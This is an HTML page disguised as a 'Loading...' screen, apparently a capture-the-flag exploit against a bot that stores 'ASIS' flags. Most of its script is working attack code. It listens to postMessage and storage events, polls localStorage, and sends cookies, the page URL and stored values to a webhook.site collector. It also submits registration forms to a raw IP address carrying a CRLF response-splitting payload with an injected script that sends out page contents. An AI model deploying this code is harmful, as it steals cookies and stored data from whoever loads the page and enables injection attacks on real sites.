<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Loading...</title>
</head>
<body>
    <h1>Processing...</h1>
    
    <iframe name="reg" style="display:none;"></iframe>
    
    <script>
    // 모든 가능한 communication 방법 감지
    
    // 1. postMessage 감지
    window.addEventListener('message', function(event) {
        fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', {
            method: 'POST',
            body: 'postMessage: ' + JSON.stringify({
                origin: event.origin,
                data: event.data
            })
        });
    });
    
    // 2. localStorage 변화 감지
    window.addEventListener('storage', function(event) {
        fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', {
            method: 'POST',
            body: 'storage_change: ' + event.key + ' = ' + event.newValue
        });
    });
    
    // 3. 주기적으로 localStorage 체크
    setInterval(function() {
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            var value = localStorage.getItem(key);
            if (value && value.indexOf('ASIS') !== -1) {
                fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', {
                    method: 'POST',
                    body: 'localStorage_FLAG: ' + key + ' = ' + value
                });
            }
        }
    }, 1000);
    
    // 4. CRLF 계정 등록
    var payload = "\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316',{method:'POST',body:document.body.innerHTML})</s"+"cript>";
    
    var flags = ['ASIS{bookmarks}','ASIS{crlf}','ASIS{xss}','ASIS{admin}','ASIS{bot}'];
    
    flags.forEach(function(f) {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://65.109.202.184/register';
        form.target = 'reg';
        
        var u = document.createElement('input');
        u.name = 'username';
        u.value = f + payload;
        
        var p = document.createElement('input');
        p.name = 'password';
        p.value = 'password';
        
        form.appendChild(u);
        form.appendChild(p);
        document.body.appendChild(form);
        form.submit();
    });
    
    // 5. 신호
    navigator.sendBeacon('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', 'comprehensive_listeners_active');
    
    // 6. 10초 후 현재 상태 덤프
    setTimeout(function() {
        var dump = {
            localStorage: {},
            cookies: document.cookie,
            url: window.location.href
        };
        
        for (var i = 0; i < localStorage.length; i++) {
            var k = localStorage.key(i);
            dump.localStorage[k] = localStorage.getItem(k);
        }
        
        fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', {
            method: 'POST',
            body: JSON.stringify(dump)
        });
    }, 10000);
    </script>
</body>
</html>
